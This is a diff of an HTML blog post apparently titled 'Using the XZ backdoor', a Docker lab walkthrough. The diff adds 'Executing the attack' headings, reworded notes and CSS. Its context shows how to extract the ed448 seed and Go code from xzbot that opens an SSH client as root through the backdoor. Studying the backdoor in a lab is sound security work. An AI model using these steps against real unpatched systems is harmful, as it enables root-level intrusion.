@@ -82,6 +82,10 @@ Machine</a>
 installation</a></li>
 <li><a href="#installing-docker-testbed"
 id="toc-installing-docker-testbed">Installing Docker Testbed</a></li>
+<li><a href="#running-the-containers"
+id="toc-running-the-containers">Running the containers</a></li>
+<li><a href="#executing-the-attack"
+id="toc-executing-the-attack">Executing the attack</a></li>
 <li><a href="#analysis-of-xzbot" id="toc-analysis-of-xzbot">Analysis of
 xzbot</a></li>
 </ul></li>
@@ -176,6 +180,7 @@ setup commands</a>: &gt;
 <div class="sourceCode" id="cb4"><pre
 class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> xz-5.6.1-backdoor</span>
 <span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> submodule update <span class="at">--init</span> <span class="at">--recursive</span></span></code></pre></div>
+<h3 id="running-the-containers">Running the containers</h3>
 <p>Now, you should be in the <a
 href="https://github.com/dguerri/exploits-collection/tree/main/xz-5.6.1-backdoor"><code>xz-5.6.1-backdoor</code></a>
 folder.</p>
@@ -196,6 +201,7 @@ correct versions of <code>xz</code> and <code>liblzma</code>. Note the
 vulnerable <code>.deb</code> for <code>liblzma</code> <a
 href="https://github.com/dguerri/exploits-collection/blob/08b65b557e93a6a8e9936c36febc6e9ef7ccbd8b/xz-5.6.1-backdoor/deb/liblzma5_5.6.1-1_amd64.deb">is
 in Davide’s repo</a>.</p>
+<h3 id="executing-the-attack">Executing the attack</h3>
 <p>Davide’s has listed instructions on <a
 href="https://github.com/dguerri/exploits-collection/blob/08b65b557e93a6a8e9936c36febc6e9ef7ccbd8b/xz-5.6.1-backdoor/README.md">how
 to execute the backdoor</a> via docker compose, but I have modified
@@ -208,12 +214,15 @@ class="sourceCode bash"><code class="sourceCode bash"><span id="cb6-1"><a href="
 <p>From here, we can attack the system as if we were running commands on
 it normally.</p>
 <blockquote>
-<p>The ed448 key pair is generated from a random seed. Info on the key
-and its seed are printed out and stored in /exploit/ed448info.txt</p>
+<p><a
+href="https://github.com/dguerri/exploits-collection/blob/main/xz-5.6.1-backdoor/README.md">Note:</a>
+The ed448 key pair is generated from a random seed. Info on the key and
+its seed are printed out and stored in
+<code>/exploit/ed448info.txt</code></p>
 </blockquote>
-<p>We want to get the seed that it randomly generated. In the real
-world, this is reminiscent of the private key that only the original
-creators of the exploit have.</p>
+<p>We want to get the seed that it randomly generated during setup. In
+the real world, this is reminiscent of the private key that only the
+original creators of the exploit have.</p>
 <div class="sourceCode" id="cb7"><pre
 class="sourceCode bash"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="co"># this extracts the seed from the information printed during the challenge setup</span></span>
 <span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="va">seed</span><span class="op">=</span><span class="st">&quot;</span><span class="va">$(</span><span class="fu">sed</span> <span class="at">-n</span> <span class="st">&#39;s/^Seed: \([0-9][0-9]*\)/\1/p&#39;</span> /exploit/ed448info.txt<span class="va">)</span><span class="st">&quot;</span></span>
@@ -238,7 +247,7 @@ class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href=
 <p>Note the output of this should end with “ssh: handshake failed: EOF”.
 This is normal.</p>
 <aside>
-<p><deatils></p>
+<details>
 <summary>
 See expected output
 </summary>
@@ -307,7 +316,7 @@ out here?</p>
 key!</p>
 <div class="sourceCode" id="cb15"><pre
 class="sourceCode go"><code class="sourceCode go"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ...</span></span>
-<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>    signingKey <span class="op">:=</span> ed448<span class="op">.</span>NewKeyFromSeed<span class="op">(</span>seed<span class="op">[:])</span>     <span class="co">// create key from same seed as in vulnerable system</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>    signingKey <span class="op">:=</span> ed448<span class="op">.</span>NewKeyFromSeed<span class="op">(</span>seed<span class="op">[:])</span>     <span class="co">// creates a key from same seed as in vulnerable system</span></span>
 <span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>    xz <span class="op">:=</span> <span class="op">&amp;</span>xzSigner<span class="op">{</span>                                <span class="co">// xzSigner takes a signing key and generates the appropriate public key</span></span>
 <span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>        signingKey<span class="op">:</span>    signingKey<span class="op">,</span>                  </span>
 <span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>        encryptionKey<span class="op">:</span> signingKey<span class="op">[</span>ed448<span class="op">.</span>SeedSize<span class="op">:],</span></span>
@@ -315,8 +324,8 @@ class="sourceCode go"><code class="sourceCode go"><span id="cb15-1"><a href="#cb
 <span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>    <span class="co">// this creates an SSH client as the root user</span></span>
 <span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>    config <span class="op">:=</span> <span class="op">&amp;</span>ssh<span class="op">.</span>ClientConfig<span class="op">{</span></span>
 <span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>        User<span class="op">:</span> <span class="st">&quot;root&quot;</span><span class="op">,</span></span>
-<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>        Auth<span class="op">:</span> <span class="op">[]</span>ssh<span class="op">.</span>AuthMethod<span class="op">{</span>                     <span class="co">// establishes the authentication method using the secret private key</span></span>
-<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>            ssh<span class="op">.</span>PublicKeys<span class="op">(</span>xz<span class="op">),</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>        Auth<span class="op">:</span> <span class="op">[]</span>ssh<span class="op">.</span>AuthMethod<span class="op">{</span>                     <span class="co">// Establishes the authentication method using the public</span></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>            ssh<span class="op">.</span>PublicKeys<span class="op">(</span>xz<span class="op">),</span>                     <span class="co">//   key generated from the initial signing key and seed.</span></span>
 <span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>        <span class="op">},</span></span>
 <span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>        HostKeyCallback<span class="op">:</span> xz<span class="op">.</span>HostKeyCallback<span class="op">,</span>        <span class="co">// takes the SSH public key and computes a hash</span></span>
 <span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
@@ -335,6 +344,17 @@ killswitch?</h2>
 <p>I consulted a bunch of resources when building this list. Here’s a
 compilation of the resources I found to be helpful, with the date they
 were first posted.</p>
+<!-- make list of links easier to read -->
+<style>
+section#further-reading li, 
+section#further-reading p {
+    line-height: 1em;
+    text-decoration: none;
+    margin: 0;
+    padding: 0;
+}
+</style>
+<section id="further-reading">
 <ul>
 <li><p>xzbot: <a href="https://github.com/amlweems/xzbot"
 class="uri">https://github.com/amlweems/xzbot</a></p>
@@ -424,6 +444,7 @@ on distrusting xz”</a> (2024-04-03)</p></li>
 <li><p><a href="https://youtu.be/vV_WdTBbww4">Low Level Learning -
 “revealing the features of the XZ backdoor”</a> (2024-04-03)</p></li>
 </ul>
+</section>
 
 
     </article>
@@ -456,6 +477,18 @@ on distrusting xz”</a> (2024-04-03)</p></li>
     <details>
       <summary>See edit history for "Using the XZ backdoor"</summary>
       <dl class="edits">
+        
+          <div class="edit">
+            <dt>
+              Zack Sargent edited this page on 
+              <time datetime="2024-04-05T01:05:27-04:00">
+                Friday, April 05, 2024 at 01:05 AM
+              </time>
+            </dt>
+            <dd>
+              1 file changed, 27 insertions(+), 6 deletions(-)
+            </dd>
+          </div>
         
           <div class="edit">
             <dt>
